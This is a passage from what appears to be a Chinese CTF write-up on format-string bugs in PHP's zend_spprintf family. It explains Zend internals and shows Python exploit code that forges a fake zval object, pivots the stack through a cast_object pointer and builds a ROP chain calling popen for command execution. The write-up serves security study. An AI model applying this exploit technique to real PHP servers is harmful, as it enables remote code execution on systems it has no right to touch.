class="string">"%d"</span>,&amp;n);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,sum(n,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当输入的n&gt;=6时，就会泄露栈上的信息。</p>
<h3 id="php中的格式化字符串函数"><a href="#php中的格式化字符串函数" class="headerlink" title="php中的格式化字符串函数"></a>php中的格式化字符串函数</h3><p>php中的格式化字符串函数主要有如下四个：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> spprintf zend_spprintf</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> strpprintf zend_strpprintf</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> vspprintf zend_vspprintf</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> vstrpprintf zend_vstrpprintf</span></span><br><span class="line"></span><br><span class="line"><span class="function">ZEND_API <span class="keyword">size_t</span> <span class="title">zend_spprintf</span><span class="params">(<span class="keyword">char</span> **message, <span class="keyword">size_t</span> max_len, <span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span> </span>;</span><br><span class="line"><span class="function">ZEND_API zend_string *<span class="title">zend_strpprintf</span><span class="params">(<span class="keyword">size_t</span> max_len, <span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span> </span>;</span><br><span class="line"><span class="function">ZEND_API <span class="keyword">size_t</span> <span class="title">zend_vspprintf</span><span class="params">(<span class="keyword">char</span> **pbuf, <span class="keyword">size_t</span> max_len, <span class="keyword">const</span> <span class="keyword">char</span> *format, va_list ap)</span></span>;</span><br><span class="line"><span class="function">ZEND_API zend_string *<span class="title">zend_vstrpprintf</span><span class="params">(<span class="keyword">size_t</span> max_len, <span class="keyword">const</span> <span class="keyword">char</span> *format, va_list ap)</span></span></span><br></pre></td></tr></table></figure>

<p>这四个函数在<code>format</code>参数被控制的情况下都会产生相似的漏洞，但是需要注意的是这四个函数中有两个<code>zend_vspprintf</code>,<code>zend_vstrpprintf</code>是非可变参函数，如果想要调用这个两个函数，就需要在外层封装一个可变参函数，然后在内部调用这两个函数。这点非常重要，因为牵扯到<code>va_list_entry</code>的初始化的问题，它初始化位置的不同也就意味着之后泄露的栈信息位置的差异(没有理解这句话的在读一遍第一节)。</p>
<p>这四个函数的<code>format</code>解析都是在函数<code>xbuf_format_converter</code>中完成的， 下面对这个函数中比较关键的几个标志进行说明：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main/spprintf.c</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">xbuf_format_converter</span><span class="params">(<span class="keyword">void</span> *xbuf, zend_bool is_char, <span class="keyword">const</span> <span class="keyword">char</span> *fmt, va_list ap)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">'p'</span>:</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">sizeof</span>(<span class="keyword">char</span> *) &lt;= <span class="keyword">sizeof</span>(u_wide_int)) &#123;</span><br><span class="line">            ui_num = (u_wide_int)((<span class="keyword">size_t</span>) va_arg(ap, <span class="keyword">char</span> *));</span><br><span class="line">            s = ap_php_conv_p2(ui_num, <span class="number">4</span>, <span class="string">'x'</span>,</span><br><span class="line">                    &amp;num_buf[NUM_BUF_SIZE], &amp;s_len);</span><br><span class="line">            <span class="keyword">if</span> (ui_num != <span class="number">0</span>) &#123;</span><br><span class="line">                *--s = <span class="string">'x'</span>;</span><br><span class="line">                *--s = <span class="string">'0'</span>;</span><br><span class="line">                s_len += <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            s = <span class="string">"%p"</span>;</span><br><span class="line">            s_len = <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        pad_char = <span class="string">' '</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> <span class="string">'n'</span>:</span><br><span class="line">        *(va_arg(ap, <span class="keyword">int</span> *)) = is_char? (<span class="keyword">int</span>)((smart_string *)xbuf)-&gt;len : (<span class="keyword">int</span>)ZSTR_LEN(((smart_str *)xbuf)-&gt;s);</span><br><span class="line">        <span class="keyword">goto</span> skip_output;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * Always extract the argument as a "char *" pointer. We</span></span><br><span class="line"><span class="comment">        * should be using "void *" but there are still machines</span></span><br><span class="line"><span class="comment">        * that don't understand it.</span></span><br><span class="line"><span class="comment">        * If the pointer size is equal to the size of an unsigned</span></span><br><span class="line"><span class="comment">        * integer we convert the pointer to a hex number, otherwise</span></span><br><span class="line"><span class="comment">        * we print "%p" to indicate that we don't handle "%p".</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">'Z'</span>: &#123;</span><br><span class="line">        zvp = (zval*) va_arg(ap, zval*); <span class="comment">// 把下一个参数作为zval指针类型</span></span><br><span class="line">        free_zcopy = zend_make_printable_zval(zvp, &amp;zcopy);</span><br><span class="line">        <span class="keyword">if</span> (free_zcopy) &#123;</span><br><span class="line">            zvp = &amp;zcopy;</span><br><span class="line">        &#125;</span><br><span class="line">        s_len = Z_STRLEN_P(zvp);</span><br><span class="line">        s = Z_STRVAL_P(zvp);</span><br><span class="line">        <span class="keyword">if</span> (adjust_precision &amp;&amp; (<span class="keyword">size_t</span>)precision &lt; s_len) &#123;</span><br><span class="line">            s_len = precision;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>%p</code>和<code>%n</code>的实现跟c语言中的<code>printf</code>函数类似，<code>%p</code>将<code>ap</code>下一个偏移位置的数据强制转为16进制字符串，<code>%n</code>是向<code>ap</code>下一个偏移位置写入当前需要打印的字符长度。<code>%Z</code>是它特有的，将<code>ap</code>下一个偏移位置的数据转化为zval指针类型，然后调用<code>zend_make_printable_zval</code>将<code>zval</code>数据类型转化为字符串，跟进一下<code>zend_make_printable_zval</code>函数：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Zend/zend.c</span></span><br><span class="line"></span><br><span class="line"><span class="function">ZEND_API <span class="keyword">int</span> <span class="title">zend_make_printable_zval</span><span class="params">(zval *expr, zval *expr_copy)</span> <span class="comment">/* &#123;&#123;&#123; */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (Z_TYPE_P(expr) == IS_STRING) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		ZVAL_STR(expr_copy, _zval_get_string_func(expr));</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ZEND_API zend_string* ZEND_FASTCALL _zval_get_string_func(zval *op) <span class="comment">/* &#123;&#123;&#123; */</span></span><br><span class="line">&#123;</span><br><span class="line">try_again:</span><br><span class="line">	<span class="keyword">switch</span> (Z_TYPE_P(op)) &#123;</span><br><span class="line">		<span class="keyword">case</span> IS_UNDEF:</span><br><span class="line">		<span class="keyword">case</span> IS_NULL:</span><br><span class="line">		<span class="keyword">case</span> IS_FALSE:</span><br><span class="line">			<span class="keyword">return</span> ZSTR_EMPTY_ALLOC();</span><br><span class="line">		<span class="keyword">case</span> IS_TRUE:</span><br><span class="line">			<span class="keyword">return</span> ZSTR_CHAR(<span class="string">'1'</span>);</span><br><span class="line">		<span class="keyword">case</span> IS_RESOURCE: &#123;</span><br><span class="line">			<span class="keyword">char</span> buf[<span class="keyword">sizeof</span>(<span class="string">"Resource id #"</span>) + MAX_LENGTH_OF_LONG];</span><br><span class="line">			<span class="keyword">int</span> len;</span><br><span class="line"></span><br><span class="line">			len = <span class="built_in">snprintf</span>(buf, <span class="keyword">sizeof</span>(buf), <span class="string">"Resource id #"</span> ZEND_LONG_FMT, (zend_long)Z_RES_HANDLE_P(op));</span><br><span class="line">			<span class="keyword">return</span> zend_string_init(buf, len, <span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> IS_LONG: &#123;</span><br><span class="line">			<span class="keyword">return</span> zend_long_to_str(Z_LVAL_P(op));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> IS_DOUBLE: &#123;</span><br><span class="line">			<span class="keyword">return</span> zend_strpprintf(<span class="number">0</span>, <span class="string">"%.*G"</span>, (<span class="keyword">int</span>) EG(precision), Z_DVAL_P(op));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> IS_ARRAY:</span><br><span class="line">			zend_error(E_NOTICE, <span class="string">"Array to string conversion"</span>);</span><br><span class="line">			<span class="keyword">return</span> zend_string_init(<span class="string">"Array"</span>, <span class="keyword">sizeof</span>(<span class="string">"Array"</span>)<span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">case</span> IS_OBJECT: &#123;</span><br><span class="line">			zval tmp;</span><br><span class="line">			<span class="keyword">if</span> (Z_OBJ_HT_P(op)-&gt;cast_object) &#123;</span><br><span class="line">				<span class="keyword">if</span> (Z_OBJ_HT_P(op)-&gt;cast_object(op, &amp;tmp, IS_STRING) == SUCCESS) &#123;</span><br><span class="line">					<span class="keyword">return</span> Z_STR(tmp);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z_OBJ_HT_P(op)-&gt;<span class="built_in">get</span>) &#123;</span><br><span class="line">				zval *z = Z_OBJ_HT_P(op)-&gt;<span class="built_in">get</span>(op, &amp;tmp);</span><br><span class="line">				<span class="keyword">if</span> (Z_TYPE_P(z) != IS_OBJECT) &#123;</span><br><span class="line">					zend_string *str = zval_get_string(z);</span><br><span class="line">					zval_ptr_dtor(z);</span><br><span class="line">					<span class="keyword">return</span> str;</span><br><span class="line">				&#125;</span><br><span class="line">				zval_ptr_dtor(z);</span><br><span class="line">			&#125;</span><br><span class="line">			zend_error(EG(exception) ? E_ERROR : E_RECOVERABLE_ERROR, <span class="string">"Object of class %s could not be converted to string"</span>, ZSTR_VAL(Z_OBJCE_P(op)-&gt;name));</span><br><span class="line">			<span class="keyword">return</span> ZSTR_EMPTY_ALLOC();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> IS_REFERENCE:</span><br><span class="line">			op = Z_REFVAL_P(op);</span><br><span class="line">			<span class="keyword">goto</span> try_again;</span><br><span class="line">		<span class="keyword">case</span> IS_STRING:</span><br><span class="line">			<span class="keyword">return</span> zend_string_copy(Z_STR_P(op));</span><br><span class="line">		EMPTY_SWITCH_DEFAULT_CASE()</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在函数 <code>_zval_get_string_func</code> 中可以看到在php中非常熟悉的转换为字符串的问题，例如数组被转化为<code>Array</code>字符串。其中需要关注的是<code>IS_OBJECT</code>时的转换，将宏展开是是下面的代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( ((*op).value.obj)-&gt;handlers-&gt;cast_object ) &#123;</span><br><span class="line">    <span class="keyword">if</span> (((*op).value.obj)-&gt;handlers-&gt;cast_object(op, &amp;tmp, IS_STRING) == SUCCESS) &#123;</span><br><span class="line">        <span class="keyword">return</span> Z_STR(tmp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ( ((*op).value.obj)-&gt;handlers-&gt;<span class="built_in">get</span>) &#123;</span><br><span class="line">    zval *z = ((*op).value.obj)-&gt;handlers-&gt;<span class="built_in">get</span>(op, &amp;tmp);</span><br><span class="line">    <span class="keyword">if</span> (Z_TYPE_P(z) != IS_OBJECT) &#123;</span><br><span class="line">        zend_string *str = zval_get_string(z);</span><br><span class="line">        zval_ptr_dtor(z);</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line">    zval_ptr_dtor(z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时需要补充一下php中的一些关键的结构体定义：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// Zend/zend_types.h</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zval_struct</span> &#123;</span></span><br><span class="line">	zend_value        value;			<span class="comment">/* value */</span></span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			ZEND_ENDIAN_LOHI_4(</span><br><span class="line">				zend_uchar    type,			<span class="comment">/* active type */</span></span><br><span class="line">				zend_uchar    type_flags,</span><br><span class="line">				zend_uchar    const_flags,</span><br><span class="line">				zend_uchar    reserved)	    <span class="comment">/* call info for EX(This) */</span></span><br><span class="line">		&#125; v;</span><br><span class="line">		<span class="keyword">uint32_t</span> type_info;</span><br><span class="line">	&#125; u1;</span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">		<span class="keyword">uint32_t</span>     next;                 <span class="comment">/* hash collision chain */</span></span><br><span class="line">		<span class="keyword">uint32_t</span>     cache_slot;           <span class="comment">/* literal cache slot */</span></span><br><span class="line">		<span class="keyword">uint32_t</span>     lineno;               <span class="comment">/* line number (for ast nodes) */</span></span><br><span class="line">		<span class="keyword">uint32_t</span>     num_args;             <span class="comment">/* arguments number for EX(This) */</span></span><br><span class="line">		<span class="keyword">uint32_t</span>     fe_pos;               <span class="comment">/* foreach position */</span></span><br><span class="line">		<span class="keyword">uint32_t</span>     fe_iter_idx;          <span class="comment">/* foreach iterator index */</span></span><br><span class="line">		<span class="keyword">uint32_t</span>     access_flags;         <span class="comment">/* class constant access flags */</span></span><br><span class="line">		<span class="keyword">uint32_t</span>     property_guard;       <span class="comment">/* single property guard */</span></span><br><span class="line">		<span class="keyword">uint32_t</span>     extra;                <span class="comment">/* not further specified */</span></span><br><span class="line">	&#125; u2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>php中的所有变量都存储在<code>zval</code>这样的结构体中，它所对应的变量类型由type这个字段标识，它的值是由value确定，它永远是一个指针类型, <code>type</code>和<code>value</code>的定义如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* regular data types */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_UNDEF					0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_NULL						1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_FALSE					2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_TRUE						3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_LONG						4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_DOUBLE					5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_STRING					6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_ARRAY					7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_OBJECT					8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_RESOURCE					9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_REFERENCE				10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* constant expressions */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_CONSTANT					11</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_CONSTANT_AST				12</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* fake types */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IS_BOOL					13</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_CALLABLE					14</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_ITERABLE					19</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_VOID						18</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* internal types */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_INDIRECT             	15</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_PTR						17</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IS_ERROR					20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">union</span> _zend_value &#123;</span><br><span class="line">	zend_long         lval;				<span class="comment">/* long value */</span></span><br><span class="line">	<span class="keyword">double</span>            dval;				<span class="comment">/* double value */</span></span><br><span class="line">	zend_refcounted  *counted;</span><br><span class="line">	zend_string      *str;</span><br><span class="line">	zend_array       *arr;</span><br><span class="line">	zend_object      *obj;</span><br><span class="line">	zend_resource    *res;</span><br><span class="line">	zend_reference   *ref;</span><br><span class="line">	zend_ast_ref     *ast;</span><br><span class="line">	zval             *zv;</span><br><span class="line">	<span class="keyword">void</span>             *ptr;</span><br><span class="line">	zend_class_entry *ce;</span><br><span class="line">	zend_function    *func;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		<span class="keyword">uint32_t</span> w1;</span><br><span class="line">		<span class="keyword">uint32_t</span> w2;</span><br><span class="line">	&#125; ww;</span><br><span class="line">&#125; zend_value;</span><br></pre></td></tr></table></figure>

<p>php对<code>value</code>指针指向的不同类型都进行了定义，例如:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_string</span> &#123;</span></span><br><span class="line">	zend_refcounted_h gc;</span><br><span class="line">	zend_ulong        h;                <span class="comment">/* hash value */</span></span><br><span class="line">	<span class="keyword">size_t</span>            len;</span><br><span class="line">	<span class="keyword">char</span>              val[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_array</span> &#123;</span></span><br><span class="line">	zend_refcounted_h gc;</span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			ZEND_ENDIAN_LOHI_4(</span><br><span class="line">				zend_uchar    flags,</span><br><span class="line">				zend_uchar    nApplyCount,</span><br><span class="line">				zend_uchar    nIteratorsCount,</span><br><span class="line">				zend_uchar    consistency)</span><br><span class="line">		&#125; v;</span><br><span class="line">		<span class="keyword">uint32_t</span> flags;</span><br><span class="line">	&#125; u;</span><br><span class="line">	<span class="keyword">uint32_t</span>          nTableMask;</span><br><span class="line">	Bucket           *arData;</span><br><span class="line">	<span class="keyword">uint32_t</span>          nNumUsed;</span><br><span class="line">	<span class="keyword">uint32_t</span>          nNumOfElements;</span><br><span class="line">	<span class="keyword">uint32_t</span>          nTableSize;</span><br><span class="line">	<span class="keyword">uint32_t</span>          nInternalPointer;</span><br><span class="line">	zend_long         nNextFreeElement;</span><br><span class="line">	<span class="keyword">dtor_func_t</span>       pDestructor;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_object</span> &#123;</span></span><br><span class="line">	zend_refcounted_h gc;</span><br><span class="line">	<span class="keyword">uint32_t</span>          handle; <span class="comment">// <span class="doctag">TODO:</span> may be removed ???</span></span><br><span class="line">	zend_class_entry *ce;</span><br><span class="line">	<span class="keyword">const</span> zend_object_handlers *handlers;</span><br><span class="line">	HashTable        *properties;</span><br><span class="line">	zval              properties_table[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>_zend_object</code>的<code>handlers</code>指向一个函数指针数组，存储<code>_zend_object</code>相关函数的地址，<code>zend_object_handlers</code>的定义如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_object_handlers</span> &#123;</span></span><br><span class="line">	<span class="comment">/* offset of real object header (usually zero) */</span></span><br><span class="line">	<span class="keyword">int</span>										offset;</span><br><span class="line">	<span class="comment">/* general object functions */</span></span><br><span class="line">	<span class="keyword">zend_object_free_obj_t</span>					free_obj;</span><br><span class="line">	<span class="keyword">zend_object_dtor_obj_t</span>					dtor_obj;</span><br><span class="line">	<span class="keyword">zend_object_clone_obj_t</span>					clone_obj;</span><br><span class="line">	<span class="comment">/* individual object functions */</span></span><br><span class="line">	<span class="keyword">zend_object_read_property_t</span>				read_property;</span><br><span class="line">	<span class="keyword">zend_object_write_property_t</span>			write_property;</span><br><span class="line">	<span class="keyword">zend_object_read_dimension_t</span>			read_dimension;</span><br><span class="line">	<span class="keyword">zend_object_write_dimension_t</span>			write_dimension;</span><br><span class="line">	<span class="keyword">zend_object_get_property_ptr_ptr_t</span>		get_property_ptr_ptr;</span><br><span class="line">	<span class="keyword">zend_object_get_t</span>						<span class="built_in">get</span>;</span><br><span class="line">	<span class="keyword">zend_object_set_t</span>						<span class="built_in">set</span>;</span><br><span class="line">	<span class="keyword">zend_object_has_property_t</span>				has_property;</span><br><span class="line">	<span class="keyword">zend_object_unset_property_t</span>			unset_property;</span><br><span class="line">	<span class="keyword">zend_object_has_dimension_t</span>				has_dimension;</span><br><span class="line">	<span class="keyword">zend_object_unset_dimension_t</span>			unset_dimension;</span><br><span class="line">	<span class="keyword">zend_object_get_properties_t</span>			get_properties;</span><br><span class="line">	<span class="keyword">zend_object_get_method_t</span>				get_method;</span><br><span class="line">	<span class="keyword">zend_object_call_method_t</span>				call_method;</span><br><span class="line">	<span class="keyword">zend_object_get_constructor_t</span>			get_constructor;</span><br><span class="line">	<span class="keyword">zend_object_get_class_name_t</span>			get_class_name;</span><br><span class="line">	<span class="keyword">zend_object_compare_t</span>					compare_objects;</span><br><span class="line">	<span class="keyword">zend_object_cast_t</span>						cast_object;</span><br><span class="line">	<span class="keyword">zend_object_count_elements_t</span>			count_elements;</span><br><span class="line">	<span class="keyword">zend_object_get_debug_info_t</span>			get_debug_info;</span><br><span class="line">	<span class="keyword">zend_object_get_closure_t</span>				get_closure;</span><br><span class="line">	<span class="keyword">zend_object_get_gc_t</span>					get_gc;</span><br><span class="line">	<span class="keyword">zend_object_do_operation_t</span>				do_operation;</span><br><span class="line">	<span class="keyword">zend_object_compare_zvals_t</span>				compare;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>通过上述的分析，可以知道在控制格式化字符串的<code>format</code>参数之后可以使用<code>%p</code>来泄露栈数据，而且至少有两种控制EIP的方法：</p>
<ol>
<li>利用 <code>%n</code>，修改栈上存储的返回地址，然后跳转到指定的位置执行。</li>
<li>利用 <code>%Z</code>，在可控的位置伪造一个<code>object</code>类型的fake<code>zval</code>，然后伪造<code>object</code>类型的函数指针数组<code>handlers</code>中的<code>get</code>或者<code>cast_object</code>函数指针为需要执行的指令地址，就可以控制EIP。</li>
</ol>
<p>由于php一般都运行在web环境中，无法直接交互，所以像直接修改返回地址为 <code>one_gadget</code> 的利用方法已经无法使用了，为了实现任意命令执行，仅控制EIP是不够的，而且还需要控制RDI，甚至RSI。控制寄存器的方法一般就是使用ROP chian，但是问题在于64位系统中函数调用时通过寄存器传参，并且zend内部注册的变量(我们的输入)一般都是存储在堆上，这两方面原因导致我们无法控制栈上的数据，所以就无法进行ROP chain，所以唯一可行的方案就是找能够进行栈迁移的 <code>gadget</code>，将栈迁移到可以控制的数据区域，接着再进行rop。@wupcoo大佬出的题目十分的经典，本文也是在学习他的题目后写的，下面就他的题目提供的exp进行讲解。</p>
<h3 id="ogeek-check-in-writeup"><a href="#ogeek-check-in-writeup" class="headerlink" title="ogeek check_in writeup"></a>ogeek check_in writeup</h3><p>题目地址<a href="https://github.com/wonderkun/CTF_web/tree/master/PHP_PWN_LEARN/format_string" target="_blank" rel="noopener">https://github.com/wonderkun/CTF_web/tree/master/PHP_PWN_LEARN/format_string</a>，原writeup地址<a href="http://www.wupco.cn/?p=4504" target="_blank" rel="noopener">http://www.wupco.cn/?p=4504</a>。</p>
<p>wupcoo原始的exp先泄露了<code>libphp.so</code>的加载基址，然后再libphp.so中找rop，这里泄露<code>libphp.so</code>加载基址的方法十分的凑巧，主要是利用<code>CppClass_render</code>函数再调用<code>render_s</code>函数之前会调用函数 <code>zend_read_property_ex</code>。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">ZEND_API zval *<span class="title">zend_read_property_ex</span><span class="params">(zend_class_entry *scope, zval *object, zend_string *name, zend_bool silent, zval *rv)</span> <span class="comment">/* &#123;&#123;&#123; */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	zval property, *value;</span><br><span class="line">	zend_class_entry *old_scope = EG(fake_scope);</span><br><span class="line"></span><br><span class="line">	EG(fake_scope) = scope;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!Z_OBJ_HT_P(object)-&gt;read_property) &#123;</span><br><span class="line">		zend_error_noreturn(E_CORE_ERROR, <span class="string">"Property %s of class %s cannot be read"</span>, ZSTR_VAL(name), ZSTR_VAL(Z_OBJCE_P(object)-&gt;name));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ZVAL_STR(&amp;property, name);</span><br><span class="line">	value = Z_OBJ_HT_P(object)-&gt;read_property(object, &amp;property, silent?BP_VAR_IS:BP_VAR_R, <span class="literal">NULL</span>, rv);</span><br><span class="line"></span><br><span class="line">	EG(fake_scope) = old_scope;</span><br><span class="line">	<span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里 <code>Z_OBJ_HT_P(object)-&gt;read_property</code> 是一个指向libphp中某个函数的函数指针，是存储在r9中的，没有被清空，所以通过泄露R9就可以获得libphp.so的加载基址，但是这种办法不通用，所以被我删除了。</p>
<p>exp中首先使用 700个 <code>%p</code> 泄露栈数据，获取一个自主可控的地址空间作为将来栈迁移的基址heap_addr以及libc.so的基址，有由于RCX的值完全可控，所以可以让RCX指向heap_addr，然后在heap_addr的位置布局object类型的fake zval，通过控制<code>object.handlers-&gt;cast_object</code>来控制EIP，将EIP劫持到指令<code>push [rcx]; rcr [rbx+0x51],0x41 ; pop rsp ;ret ;</code>的位置来进行栈迁移，并同时布局rop chain用于控制RDI和RSI，最后跳转到<code>popen</code>进行任意命令执行。栈数据构造的代码以及注释如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">exp = p64(heap_addr+<span class="number">0x10</span>) <span class="comment"># heap_addr; 布局 fake zval, zval.value.obj= heap_addr+0x10 , size0f(zval)  = 0x10        </span></span><br><span class="line">exp += p64(<span class="number">0x8</span>)           <span class="comment"># heap_addr+0x8 ;   zval.type = 0x8</span></span><br><span class="line">exp += p64(heap_addr+<span class="number">0x20</span>)<span class="comment"># heap_addr+0x10 ;  布局 zend_object,   sizeof(zend_object) = 0x38 0x7f9746cd29a8</span></span><br><span class="line">exp += bytes(<span class="string">"AAAAAAAA"</span>,encoding=<span class="string">"latin-1"</span>)  <span class="comment"># heap_addr+0x18   </span></span><br><span class="line">exp += p64(pop_ret)        <span class="comment"># heap_addr+0x20       # </span></span><br><span class="line">exp += p64(heap_addr+<span class="number">0x30</span>) <span class="comment"># heap_addr + 0x28    zend_object.handlers  = heap_addr + 0x30</span></span><br><span class="line">exp += p64(pop_rdi)        <span class="comment"># heap_addr + 0x30    布局 zend_object_handlers: sizeof(zend_object_handlers) = 0xe0 </span></span><br><span class="line">exp += p64(heap_addr+<span class="number">0xe8</span>) <span class="comment"># heap_addr + 0x38    指向command字符串</span></span><br><span class="line">exp += p64(pop_rsi)        <span class="comment"># heap_addr + 0x40    </span></span><br><span class="line">exp += p64(heap_addr+<span class="number">0xe0</span>) <span class="comment"># heap_addr + 0x48    指向字符串"r"</span></span><br><span class="line">exp += p64(call_popen)     <span class="comment"># heap_addr + 0x50    popen函数地址 </span></span><br><span class="line">exp += bytes(<span class="string">"CCCCCCCC"</span>*<span class="number">16</span>,encoding=<span class="string">"latin-1"</span>)  <span class="comment"># heap_addr + 0x58</span></span><br><span class="line">exp += p64(magic_addr)     <span class="comment"># heap_addr + 0xd8    伪造 zend_object_handlers-&gt;cast_object 进行栈迁移</span></span><br><span class="line">exp += bytes(<span class="string">"r"</span>,encoding=<span class="string">"latin-1"</span>)+<span class="string">b"\x00"</span>*<span class="number">7</span> <span class="comment"># heap_addr + 0xe0</span></span><br><span class="line">exp += command.ljust(<span class="number">80</span>,<span class="string">b'\x00'</span>) <span class="comment">#heap_addr + 0xe8</span></span><br><span class="line">exp += bytes(<span class="string">"AAAAAAAA"</span>,encoding=<span class="string">"latin-1"</span>)</span><br></pre></td></tr></table></figure>

<p>在栈上布局<code>fake zval</code>的同时还需要考虑rop chain的布局，这个exp很有意思。</p>
